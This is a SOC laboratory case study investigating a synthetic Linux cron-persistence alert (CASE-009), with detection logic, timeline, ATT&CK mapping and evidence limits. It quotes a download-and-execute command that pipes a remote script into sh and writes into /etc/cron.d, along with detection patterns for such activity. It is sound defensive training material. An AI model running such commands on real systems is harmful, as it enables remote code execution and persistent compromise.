# CASE-009 — Linux Cron Persistence Investigation

## 1. Case Overview

| Field | Value |
|---|---|
| Case ID | `CASE-009` |
| Detection | `DET-LINUX-001` |
| Detection Name | Suspicious Linux Cron Persistence Detection |
| Alert | `ALERT-CASE-009-DET-LINUX-001` |
| Severity | High |
| Confidence | High |
| Primary Host | `lab-linux-02` |
| User | `analyst` |
| Primary Process | `bash` |
| Primary Event | `EVT-009001` |
| SOC Playbook | `PB-007 — Linux Security Event` |
| Related Behavior | Suspicious Cron Persistence |
| SIEM Coverage | Full Linux/persistence detection coverage gap |
| Environment | Authorized synthetic SOC laboratory |

---

## 2. Executive Summary

CASE-009 investigates suspicious Linux cron persistence activity detected in the CYBERNOVA SOC Operations Laboratory.

The detection engine generated `ALERT-CASE-009-DET-LINUX-001` from `EVT-009001`, which contained three independent suspicious indicators against a configured minimum of two.

The observed indicators were:

1. `cron_persistence_path`
2. `shell_download_execution`
3. `hidden_or_tmp_payload`

The activity is suspicious and requires investigation. However, the available evidence does not establish successful persistence, successful payload retrieval or execution, malware presence, host compromise, attacker attribution, or real-world impact.

A second event, `EVT-009002`, recorded ordinary interactive cron administration using `crontab -e` and did not trigger the detection.

---

## 3. Cross-Project Evidence Chain

```text
Synthetic Linux Telemetry
        ↓
DET-LINUX-001
        ↓
ALERT-CASE-009-DET-LINUX-001
        ↓
CASE-009
        ↓
PB-007 — Linux Security Event
        ↓
Investigation / Hunting / TI
        ↓
Detection Engineering Feedback
```

This represents a laboratory SOC workflow and does not constitute evidence of a production incident.

## 4. Detection Contract

DET-LINUX-001 evaluates:

event_type == "linux_persistence"
status == "success"

The detector requires at least:

LINUX_001_MIN_INDICATORS = 2
Configured indicators
Cron persistence path

The detector recognizes monitored cron locations including:

/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/var/spool/cron/
/var/spool/cron/crontabs/

Indicator:

cron_persistence_path

Suspicious cron command

The detector identifies suspicious crontab command patterns while excluding ordinary:

crontab -e

Indicator:

suspicious_cron_command

Shell download and execution

The detector recognizes combinations involving:

curl
wget

with:

| sh
| bash

Indicator:

shell_download_execution

This is suspicious because retrieved content is passed directly to a shell interpreter, but it does not independently prove successful retrieval or malicious execution.

Hidden or temporary payload

The detector identifies references to:

/tmp/
/var/tmp/
/dev/shm/

or metadata containing:

hidden_payload == true

Indicator:

hidden_or_tmp_payload

## 5. Detection Threshold Assessment

The configured minimum is:

2 indicators

EVT-009001 contained:

3 indicators

Therefore:

3 >= 2

The event satisfied the detection contract and generated the CASE-009 alert.

This establishes that the detector behaved as intended against the supplied laboratory fixture.

## 6. Triggering Evidence
EVT-009001
Timestamp: 2026-09-09 13:00:00 UTC
Host: lab-linux-02
User: analyst
Process: bash

Command:

curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update

Referenced file:

/etc/cron.d/system-update

Synthetic metadata included:

hidden_payload: true
Observed indicators

The event contained:

cron_persistence_path
shell_download_execution
hidden_or_tmp_payload

These three indicators exceeded the minimum threshold of two.

## 7. Indicator Assessment
Finding 1 — Suspicious Cron Persistence Path

EVT-009001 referenced:

/etc/cron.d/system-update

This is a monitored cron persistence location and therefore represents activity requiring investigation.

The evidence does not independently establish that persistence became active.

Finding 2 — Download-and-Execute Pattern

The command contained:

curl http://203.0.113.80/payload.sh | sh

This records a download-and-execute pattern.

The evidence does not establish:

successful network retrieval;
the contents of /payload.sh;
successful shell execution;
malware execution.
Finding 3 — Hidden Payload Context

The synthetic metadata contained:

hidden_payload: true

This contributed the third detection indicator.

It is treated as laboratory evidence rather than proof of malicious activity.

## 8. Benign Comparison Event
EVT-009002
Timestamp: 2026-09-09 13:01:00 UTC
Host: lab-linux-02
User: admin
Process: crontab
Command: crontab -e
Referenced file: /var/spool/cron/crontabs/admin

This event did not trigger DET-LINUX-001.

The comparison is useful because ordinary interactive cron administration is not automatically classified as suspicious by the current detection logic.

This single benign event does not establish production false-positive performance.

## 9. Timeline
2026-09-09 13:00:00 UTC

EVT-009001 records suspicious Linux cron-related activity on lab-linux-02.

Three configured indicators are present.

DET-LINUX-001 generates:

ALERT-CASE-009-DET-LINUX-001
2026-09-09 13:01:00 UTC

EVT-009002 records ordinary:

crontab -e

activity by user admin.

No alert is generated.

## 10. Threat Intelligence Assessment

The network observable:

203.0.113.80

is treated as a synthetic documentation-range value for this laboratory case.

It is not evidence of real malicious infrastructure.

The referenced resource:

/payload.sh

is treated as a suspicious resource reference.

The case does not contain:

the actual resource;
its contents;
a cryptographic hash;
a malware-analysis verdict.

No real-world threat actor, campaign, infrastructure owner, or malware family is attributed.

## 11. MITRE ATT&CK Context

The behavior is mapped to:

Tactic: Persistence
Technique: T1053.003
Name: Cron

This mapping describes the behavioral category represented by the detection.

It does not independently prove successful persistence.

## 12. Threat-Hunting Assessment

Recommended hunting pivots include:

other cron configuration modifications;
/etc/cron.d/;
/etc/cron.daily/;
/etc/cron.hourly/;
/var/spool/cron/;
/var/spool/cron/crontabs/;
curl and wget activity;
shell download-and-execute patterns;
temporary or hidden payload activity;
related activity from lab-linux-02;
related activity involving user analyst;
process ancestry;
subsequent execution;
network connections associated with suspicious commands.

No additional hunting results are claimed because the supplied case dataset contains only the documented laboratory events.

Absence of evidence in this dataset does not prove absence of activity outside it.

## 13. Response Assessment

The appropriate current defensive response is:

Preserve the evidence and validate whether the referenced cron configuration, payload, process activity, and network activity actually occurred.

For a real incident, containment and eradication could be considered if additional authorized evidence confirmed active malicious persistence.

For this laboratory case:

no production containment is claimed;
no production eradication is claimed;
no credential reset is claimed;
no recovery action is claimed.
## 14. Root Cause Assessment

A definitive root cause cannot be established.

The available telemetry does not determine:

initial access method;
whether an account was compromised;
whether the activity was authorized;
whether the payload was successfully retrieved;
whether persistence became active;
whether other systems were affected.

Root cause therefore remains undetermined.

## 15. Impact Assessment

No real-world impact is established.

The available evidence does not demonstrate:

successful compromise;
data access;
data exfiltration;
lateral movement;
privilege escalation;
malware execution;
persistence activation;
service disruption.

The evidence supports suspicious activity without confirmed impact.

## 16. Evidence Limitations

The current case lacks:

cron service logs;
full cron configuration contents;
file hashes;
payload contents;
process ancestry;
process exit status;
network connection results;
DNS telemetry;
file creation metadata;
host integrity telemetry;
additional authentication evidence;
malware-analysis results.

These limitations prevent stronger conclusions.

## 17. Detection Performance Against the Fixture
Measurement	Result
Suspicious event	Detected
Benign administrative event	Not detected
Alerts generated	1
Suspicious indicators	3
Minimum configured indicators	2

The supplied fixture demonstrates the intended positive and benign behavior.

It does not establish:

production detection performance;
generalized false-positive rate;
generalized false-negative rate;
production SOC effectiveness.
## 18. SIEM Cross-Project Coverage Assessment

The current SIEM Detection Lab contains:

RULE-001 — Brute Force Detection
RULE-002 — Successful Login After Multiple Failures
RULE-003 — Distributed Password Spray Detection

Repository inspection found no implemented equivalent Linux persistence or cron detection rule.

Documentation references to cron, persistence, and T1053.003 do not constitute detection implementation.

Therefore the current classification is:

FULL SIEM LINUX/PERSISTENCE DETECTION COVERAGE GAP

The appropriate Phase 22 action is documentation of the gap.

No new SIEM rule is being implemented as part of this case study.

## 19. Engineering Significance

CASE-009 demonstrates that the SOC Operations Lab contains a defined Linux persistence detection and investigation workflow while the current SIEM Detection Lab does not yet implement equivalent coverage.

This distinction is important:

SOC detection contract
        ≠
Implemented SIEM rule

The cross-project review identifies a concrete future detection-engineering opportunity without falsely claiming that the SIEM currently detects Linux persistence.

## 20. Detection Improvement Feedback

Future engineering work could evaluate:

multi-event correlation;
process ancestry;
cron service execution telemetry;
file creation/modification correlation;
network-to-process correlation;
file-hash enrichment;
malware-analysis enrichment;
longer observation windows;
additional benign administrative cases;
adversarial evasion testing.

Any future modification should include:

updated detection documentation;
regression tests;
benign tests;
malformed-input tests;
threshold tests;
adversarial tests;
validation against laboratory telemetry.

These improvements are recommendations only and are not represented as completed capabilities.

## 21. False-Positive Considerations

Potential legitimate activity includes:

system administration;
authorized cron configuration;
software installation;
scheduled maintenance;
deployment automation;
security testing;
administrative scripts.

The crontab -e comparison event demonstrates why analyst validation remains necessary.

## 22. False-Negative Considerations

Potential blind spots include:

persistence below the two-indicator threshold;
slow persistence activity;
alternative persistence mechanisms;
encoded or obfuscated commands;
activity outside monitored cron paths;
incomplete telemetry;
distributed activity;
lack of process/network correlation.

These are engineering considerations, not observed failures in CASE-009.

## 23. Evidence Quality
Strong evidence
EVT-009001 triggered the detection.
Three configured indicators are documented.
The minimum threshold is two.
Host and user are identified.
Process is identified.
Command is recorded.
Referenced cron path is recorded.
EVT-009002 provides a benign comparison.
Detection and alert IDs are defined.
Severity and confidence are defined.
MITRE ATT&CK context is documented.
Evidence limitations

The evidence does not establish:

successful persistence;
successful payload retrieval;
successful payload execution;
malware presence;
compromise;
attacker attribution;
real-world infrastructure;
impact.
## 24. Portfolio Integrity Statement

This case study demonstrates laboratory SOC detection and investigation engineering.

It does not claim:

production SOC experience;
a real security incident;
a real compromised host;
confirmed malware;
successful persistence;
attacker attribution;
real malicious infrastructure;
production containment;
production eradication;
real-world impact.

All conclusions are limited to the supplied synthetic laboratory telemetry and repository-defined detection logic.

## 25. Final Assessment

Disposition:

Suspicious activity confirmed; compromise not established from available evidence.

Detection result:

DET-LINUX-001 correctly identified the intended synthetic suspicious cron-persistence scenario using three indicators against a minimum threshold of two.

Persistence confirmation:

Not established.

Payload execution:

Not established.

Malware confirmation:

Not established.

SIEM coverage:

Full Linux/persistence detection coverage gap.

Primary SOC playbook:

PB-007 — Linux Security Event

ATT&CK context:

T1053.003 — Cron

Production impact:

None claimed.

Evidence basis:

Synthetic laboratory telemetry only.

## 26. Cross-Project Conclusion

CASE-009 demonstrates the following SOC investigation path:

Synthetic Linux Telemetry
        ↓
DET-LINUX-001
        ↓
Alert
        ↓
CASE-009
        ↓
PB-007
        ↓
Evidence Review
        ↓
Timeline Reconstruction
        ↓
Indicator Assessment
        ↓
Threat Intelligence
        ↓
Threat Hunting
        ↓
MITRE ATT&CK Classification
        ↓
Response Assessment
        ↓
Impact Assessment
        ↓
Detection Improvement

The cross-project review additionally establishes:

SOC Operations Lab
        │
        │ DET-LINUX-001
        ▼
    CASE-009
        │
        ▼
SIEM Detection Lab
        │
        └── No equivalent Linux/persistence rule

The correct engineering action at this stage is to document the gap and preserve it as future detection-engineering work rather than prematurely adding functionality during the case-study phase.
